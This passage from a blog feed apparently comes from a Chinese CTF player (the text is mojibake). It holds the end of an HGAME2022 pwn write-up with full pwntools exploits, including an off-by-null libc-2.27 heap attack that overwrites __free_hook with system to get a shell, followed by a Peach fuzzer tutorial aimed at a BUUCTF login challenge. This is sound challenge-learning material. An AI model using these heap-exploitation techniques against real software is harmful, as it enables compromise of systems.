class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>, p64(system)[:-<span class="number">1</span>] + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="sized-note"><a href="#sized-note" class="headerlink" title="sized_note"></a>sized_note</h3><p>libc2.27 çš„ off-by-null æ¨¡æ¿é¢˜ã€‚</p><p>exp å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&quot;./note&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size, content</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sh.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>, content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, payload</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sh.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(index).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">11</span>):</span><br><span class="line">    add(i, <span class="number">0xF8</span>, <span class="string">&quot;a&quot;</span>*<span class="number">0xF7</span>)</span><br><span class="line">    </span><br><span class="line">add(<span class="number">12</span>, <span class="number">0x60</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">10</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">    </span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0xF0</span> + p64(<span class="number">0x200</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x78</span>, <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x78</span>, <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>] - <span class="number">0x10</span> - <span class="number">0x60</span> log.success(<span class="string">&quot;libc_base=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">__free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x60</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">delete(<span class="number">12</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>, p64(__free_hook))</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x60</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x60</span>, p64(system))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;é—²ç€æ—¶å°±å»æ‰“äº†ä¸‹æ­ç”µçš„ HGAME2022ï¼Œä»¥ä¸ºç¬¬ä¸€å‘¨çš„é¢˜ç›®éƒ½ä¼šè›®ç®€å•çš„ï¼Œæ²¡æƒ³åˆ°æ¯é“é¢˜éƒ½èŠ±äº†ä¸å°‘åŠŸå¤«ï¼Œå‡ºé¢˜äººç”šè‡³è¿˜åªæ˜¯å¤§äºŒå­¦ç”Ÿï¼Œé¡¿æ—¶æ„Ÿè§‰åˆ°å‚å·®äº†ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="wp" scheme="http://example.com/categories/ctf/wp/"/>
    
    
  </entry>
  
  <entry>
    <title>peachå­¦ä¹ åŠåœ¨webé¢†åŸŸçš„åº”ç”¨</title>
    <link href="http://example.com/2022/01/04/peach/"/>
    <id>http://example.com/2022/01/04/peach/</id>
    <published>2022-01-04T10:02:26.000Z</published>
    <updated>2023-02-20T06:22:46.433Z</updated>
    
    <content type="html"><![CDATA[<p>ç½‘ä¸Šå…³äºpeachæ¡†æ¶çš„èµ„æ–™å°‘çš„å¯æ€œã€‚æœ€åè·Ÿç€ä¸€ä½åšä¸»çš„åšå®¢å­¦äº†ä¸‹æ¥ï¼Œä¸è¿‡å­¦çš„æ˜¯Fuzz Web Apiã€‚å°±æ˜¯ä¸‹é¢çš„åšå®¢ã€‚æ„Ÿè°¢å¤§ä½¬ã€‚</p><blockquote><p><a href="https://blog.csdn.net/qq_27446553/article/details/103278465?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-4.no_search_link&spm=1001.2101.3001.4242.3&utm_relevant_index=7">PeachåŸç†ç®€ä»‹ä¸å®æˆ˜ï¼šä»¥Fuzz Web APIä¸ºä¾‹</a></p></blockquote><p>æ¥ä¸‹æ¥å°±ç®€å•è®°å½•ä¸€ä¸‹ä»Šå¤©ä¸‹åˆå¯¹peachæ¡†æ¶çš„ç²—æµ…å°è¯•ã€‚</p><h3 id="ä»¥ä¸‹æ˜¯å·¥ä½œæ–‡ä»¶å¤¹å’Œæˆæœå±•ç¤º"><a href="#ä»¥ä¸‹æ˜¯å·¥ä½œæ–‡ä»¶å¤¹å’Œæˆæœå±•ç¤º" class="headerlink" title="ä»¥ä¸‹æ˜¯å·¥ä½œæ–‡ä»¶å¤¹å’Œæˆæœå±•ç¤º"></a>ä»¥ä¸‹æ˜¯å·¥ä½œæ–‡ä»¶å¤¹å’Œæˆæœå±•ç¤º</h3><span id="more"></span><p>ç”¨äºæ„å»ºpeachæ•°æ®ã€çŠ¶æ€ã€é…ç½®æ¨¡å‹çš„å·¥ä½œæ–‡ä»¶å¤¹</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/36888/13/19529/96612/63f30d08Feb24adf9/a6aea8c9943dd22f.png" style="zoom:80%;" /><p>ç»ˆç«¯ä¸Šè·‘èµ·æ¥çš„æ•ˆæœ</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/147533/9/35684/456840/63f30d2dF161352fc/a08d0db0bc4af605.png" style="zoom:80%;" /><p>BurpSuiteä¸Šæ”¶åˆ°çš„ç›¸åº”æŠ¥æ–‡</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/98767/29/33250/297091/63f30d0bFb8fb82ca/6bd323358754cd20.png" style="zoom: 80%;" /><h2 id="ä»¥BUUCTFä¸Šçš„-HFCTF2020-EasyLoginä½œæµ‹è¯•ç›®æ ‡å¹³å°"><a href="#ä»¥BUUCTFä¸Šçš„-HFCTF2020-EasyLoginä½œæµ‹è¯•ç›®æ ‡å¹³å°" class="headerlink" title="ä»¥BUUCTFä¸Šçš„[HFCTF2020]EasyLoginä½œæµ‹è¯•ç›®æ ‡å¹³å°"></a>ä»¥BUUCTFä¸Šçš„[HFCTF2020]EasyLoginä½œæµ‹è¯•ç›®æ ‡å¹³å°</h2><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/139096/24/33662/90948/63f30d09Fb4c62a89/64c19668c4ee0bbd.png"  /><h3 id="1-è·å–è¯·æ±‚æŠ¥æ–‡çš„æ¨¡æ¿ä½œä¸ºlogin-bin"><a href="#1-è·å–è¯·æ±‚æŠ¥æ–‡çš„æ¨¡æ¿ä½œä¸ºlogin-bin" class="headerlink" title="1. è·å–è¯·æ±‚æŠ¥æ–‡çš„æ¨¡æ¿ä½œä¸ºlogin.bin"></a>1. è·å–è¯·æ±‚æŠ¥æ–‡çš„æ¨¡æ¿ä½œä¸ºlogin.bin</h3><p>æˆ‘ä»¬è¾“å…¥ç”¨æˆ·åå’Œå¯†ç åï¼Œç‚¹å‡»LOGINæŒ‰é’®ï¼Œæ­¤æ—¶å®¢æˆ·ç«¯å°±ä¼šå‘é€ä¸€ä¸ªè¯·æ±‚ï¼Œåœ¨BurpSuiteä¸Šæˆ‘ä»¬ä¾¿èƒ½æ‹¿åˆ°è¯¥è¯·æ±‚æ¨¡æ¿ï¼Œå¦‚ä¸‹å›¾ã€‚</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/146986/39/33790/197181/63f30d09F92d9b534/300bedb499608595.png"  /><p>æˆ‘ä»¬æ–°å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œå°†è¯¥æ¨¡æ¿å¤åˆ¶åˆ° login.bin é‡Œï¼Œå¦‚ä¸‹å›¾ã€‚ï¼ˆå¯ä»¥éšæ„å‘½åï¼Œä¿å­˜ä¸º.binæ–‡ä»¶å³å¯</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/135662/23/29143/105109/63f30e75F10af121f/30fb22f355f79ada.png" style="zoom: 80%;" /><h3 id="2-æ ¹æ®-binæ¨¡æ¿æ„é€ æ•°æ®æ¨¡å‹1-my-data-xml"><a href="#2-æ ¹æ®-binæ¨¡æ¿æ„é€ æ•°æ®æ¨¡å‹1-my-data-xml" class="headerlink" title="2. æ ¹æ®.binæ¨¡æ¿æ„é€ æ•°æ®æ¨¡å‹1-my_data.xml"></a>2. æ ¹æ®.binæ¨¡æ¿æ„é€ æ•°æ®æ¨¡å‹1-my_data.xml</h3><p>åˆ›å»ºä¸€ä¸ª1-my_data.xmlï¼Œå­˜æ”¾å¦‚ä¸‹ä»£ç ã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Peach</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://peachfuzzer.com/2012/Peach&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://peachfuzzer.com/2012/Peach ../peach.xsd&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">DataModel</span> <span class="attr">name</span>=<span class="string">&quot;my_data_model&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">DataModel</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">Peach</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­DataModelå…ƒç´ ä¸‹æ”¾çš„ä¾¿æ˜¯å„è¡Œçš„<strong>å­—ç¬¦ä¸²æˆ–ç¬¦å·</strong>ï¼Œéœ€è¦åŒºåˆ†å¼€æ¥ã€‚ä»¥å‰å‡ è¡Œä¸ºä¾‹ã€‚tokenä»£è¡¨æ˜¯å¦ä¸ºç‰¹æ®Šç¬¦å·ï¼Œåƒ <strong>â€˜:â€™ â€˜&amp;â€™<strong>ä¹‹ç±»çš„éƒ½è¦è¿›è¡ŒåŒºåˆ†ã€‚mutableæ„ä¸ºå¯å˜çš„ï¼Œä¹Ÿå°±æ˜¯è¯¥æ•°æ®æ¨¡å—éœ€è¦<span style="color:red;font-weight:600">å˜å¼‚</span>çš„åœ°æ–¹ã€‚ç¬”è€…æ˜¯å¯¹</strong>admin</strong>å’Œ<strong>password</strong>çš„å€¼è®¾ç½®å¯å˜å¼‚ã€‚</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/143628/18/31276/331864/63f30ed8Fa32d3a88/5a67d3a1bd2bb451.png" style="zoom:80%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/49739/34/18962/171555/63f30e66F3b53cfe1/0ae126b36d5a29fe.png" style="zoom:80%;" /><p>æ„é€ DataModelæ˜¯ä¸€ä¸ªæ¯”è¾ƒè´¹åŠ›çš„è¿‡ç¨‹ï¼Œè¿˜å¥½Peachå®‰è£…åŒ…é‡Œæä¾›äº†æ ¡éªŒDataModelæ˜¯å¦ä¸æˆ‘ä»¬çš„.binå¯¹åº”çš„å·¥å…·Peach Validatorï¼Œæ‰è®©é•¿æ—¶é—´çš„åŠªåŠ›æœ‰äº†æ•ˆç‡ã€‚</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/194622/32/32714/457318/63f30ed7Ff9c6f305/7222cd64af03823e.png" style="zoom: 67%;" /><h3 id="3-æ„é€ é…ç½®æ¨¡å‹2-my-xml-config"><a href="#3-æ„é€ é…ç½®æ¨¡å‹2-my-xml-config" class="headerlink" title="3. æ„é€ é…ç½®æ¨¡å‹2-my_xml.config"></a>3. æ„é€ é…ç½®æ¨¡å‹2-my_xml.config</h3><p>éœ€æ ¹æ®ç›®æ ‡ç«¯å£è¿›è¡Œé…ç½®</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PitDefines</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">All</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IPv4</span> <span class="attr">key</span>=<span class="string">&quot;TargetAddress&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">value</span>=<span class="string">&quot;848e59df-143b-4177-bf5b-c6b70a18e040.node4.buuoj.cn&quot;</span> /&gt;</span></span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;<span class="name">Range</span> <span class="attr">key</span>=<span class="string">&quot;TargetPort&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">value</span>=<span class="string">&quot;81&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">min</span>=<span class="string">&quot;0&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">max</span>=<span class="string">&quot;65535&quot;</span> /&gt;</span></span><br><span class="line">   </span><br><span class="line"><span class="tag">&lt;<span class="name">Range</span> <span class="attr">key</span>=<span class="string">&quot;Timeout&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">value</span>=<span class="string">&quot;5000&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">min</span>=<span class="string">&quot;0&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">max</span>=<span class="string">&quot;999999&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">All</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">PitDefines</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Peach</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="4-æ„å»ºçŠ¶æ€æ¨¡å‹3-my-state-xml"><a href="#4-æ„å»ºçŠ¶æ€æ¨¡å‹3-my-state-xml" class="headerlink" title="4. æ„å»ºçŠ¶æ€æ¨¡å‹3-my_state.xml"></a>4. æ„å»ºçŠ¶æ€æ¨¡å‹3-my_state.xml</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Peach</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://peachfuzzer.com/2012/Peach&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://peachfuzzer.com/2012/Peach ../peach.xsd&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">&lt;!-- å¯¼å…¥æ•°æ®æ¨¡å‹ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Include</span> <span class="attr">ns</span>=<span class="string">&quot;MyData&quot;</span> <span class="attr">src</span>=<span class="string">&quot;D:\\Fuzzâ€”â€”peach\\MyPeachPit\\1-my_data.xml&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">StateModel</span> <span class="attr">name</span>=<span class="string">&quot;My_State&quot;</span> <span class="attr">initialState</span>=<span class="string">&quot;state_one&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">State</span> <span class="attr">name</span>=<span class="string">&quot;state_one&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Action</span> <span class="attr">type</span>=<span class="string">&quot;output&quot;</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!-- å¼•ç”¨åä¸ºmy_data_modelçš„ModelData --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">DataModel</span> <span class="attr">ref</span>=<span class="string">&quot;MyData:my_data_model&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Data</span> <span class="attr">fileName</span>=<span class="string">&quot;D:\\Fuzzâ€”â€”peach\\MyPeachPit\\login.bin&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">Action</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">Action</span> <span class="attr">type</span>=<span class="string">&quot;input&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">DataModel</span> <span class="attr">name</span>=<span class="string">&quot;NULL&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">Blob</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">DataModel</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">Action</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">State</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">StateModel</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">Peach</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="5-æ„å»ºç»¼åˆæ¨¡å‹4-my-integrate-xml"><a href="#5-æ„å»ºç»¼åˆæ¨¡å‹4-my-integrate-xml" class="headerlink" title="5. æ„å»ºç»¼åˆæ¨¡å‹4-my_integrate.xml"></a>5. æ„å»ºç»¼åˆæ¨¡å‹4-my_integrate.xml</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Peach</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://peachfuzzer.com/2012/Peach&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://peachfuzzer.com/2012/Peach ../peach.xsd&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">&lt;!-- å¼•å…¥çŠ¶æ€æ¨¡å‹ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Include</span> <span class="attr">ns</span>=<span class="string">&quot;MyState&quot;</span> <span class="attr">src</span>=<span class="string">&quot;D:\\Fuzzâ€”â€”peach\\MyPeachPit\\3-my_state.xml&quot;</span> /&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">Agent</span> <span class="attr">name</span>=<span class="string">&quot;LocalAgent&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Agent</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Test</span> <span class="attr">name</span>=<span class="string">&quot;Default&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Agent</span> <span class="attr">ref</span>=<span class="string">&quot;LocalAgent&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">StateModel</span> <span class="attr">ref</span>=<span class="string">&quot;MyState:My_State&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">Publisher</span> <span class="attr">class</span>=<span class="string">&quot;Tcp&quot;</span> <span class="attr">name</span>=<span class="string">&quot;tcp&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- ä¸ºBurpSuiteä»£ç†ip --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Param</span> <span class="attr">name</span>=<span class="string">&quot;Host&quot;</span> <span class="attr">value</span>=<span class="string">&quot;127.0.0.1&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Param</span> <span class="attr">name</span>=<span class="string">&quot;Port&quot;</span> <span class="attr">value</span>=<span class="string">&quot;8080&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Param</span> <span class="attr">name</span>=<span class="string">&quot;Timeout&quot;</span> <span class="attr">value</span>=<span class="string">&quot;5000&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Publisher</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">Logger</span> <span class="attr">class</span>=<span class="string">&quot;File&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Param</span> <span class="attr">name</span>=<span class="string">&quot;Path&quot;</span> <span class="attr">value</span>=<span class="string">&quot;##LogPath##&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Logger</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Test</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Peach</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åŒæ—¶ä¿®æ”¹BurpSuiteä¸Šçš„ä»£ç†ä¿¡æ¯ï¼Œipå’Œç«¯å£ä¸ç”¨æ”¹ï¼Œåªéœ€å°†å…¶é‡å®šä½è‡³ç›®æ ‡é¶æœºï¼Œå¦‚ä¸‹å›¾ã€‚</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/191931/20/33255/92329/63f30e6fF8ef6d164/475421ea9573964f.png" style="zoom: 67%;" /><h3 id="6-æœ€åæ£€éªŒæµ‹è¯•å¥—æ˜¯å¦æ­£ç¡®"><a href="#6-æœ€åæ£€éªŒæµ‹è¯•å¥—æ˜¯å¦æ­£ç¡®" class="headerlink" title="6. æœ€åæ£€éªŒæµ‹è¯•å¥—æ˜¯å¦æ­£ç¡®"></a>6. æœ€åæ£€éªŒæµ‹è¯•å¥—æ˜¯å¦æ­£ç¡®</h3><p>åœ¨å…¶ç›®å½•ä¸‹è¾“å…¥ä»¥ä¸‹å‘½ä»¤<code>peach 4-my_integrate.xml -1</code>ï¼Œå‡ºç°ä¸‹å›¾å°±è¯´æ˜é…ç½®æˆåŠŸäº†ã€‚</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/123158/8/35793/67146/63f3107cF0548a812/8c4610fcb5dc6a2d.png" style="zoom:80%;" /><h3 id="7-å¼€å§‹fuzz"><a href="#7-å¼€å§‹fuzz" class="headerlink" title="7. å¼€å§‹fuzz"></a>7. å¼€å§‹fuzz</h3><p>è¾“å…¥å‘½ä»¤<code>peach 4-my_integrate.xml -range 1,150000</code></p><p>æ„ä¸ºå‘é€15wä¸ªå˜å¼‚æŠ¥æ–‡ï¼Œ15wä¸ºå®˜æ–¹æ¨èæ•°é‡ã€‚</p><p>æ³¨ï¼šè®°å¾—å…³æ‰ intercept æˆªå¬å™¨ï¼Œå¦åˆ™å¾—ä¸€ä¸ªä¸ªæŒ‰forwardå‘é€è¯·æ±‚æŠ¥æ–‡ï¼Œæœ€ååœ¨Http Historyç•Œé¢ç­›é€‰å¼‚å¸¸æŠ¥æ–‡å³å¯ã€‚</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>ä½œä¸ºä¸€åèœé¸¡äºŒè¿›åˆ¶æ‰‹ï¼Œå­¦åˆ°äº†æŒºå¤šçš„webçŸ¥è¯†ï¼Œä¹ŸæŒºå¥½ã€‚åœ¨å®è·µä¸­ç¨å¾®ç†Ÿæ‚‰äº†peachæ¡†æ¶çš„æ„å»ºæµç¨‹ã€‚</p><p>ä¸è¿‡ä¹Ÿé‡åˆ°äº†å¾ˆå¤šé—®é¢˜ï¼Œå°±æ˜¯â€Content-Lengthâ€çš„å€¼çš„é—®é¢˜ï¼Œå› 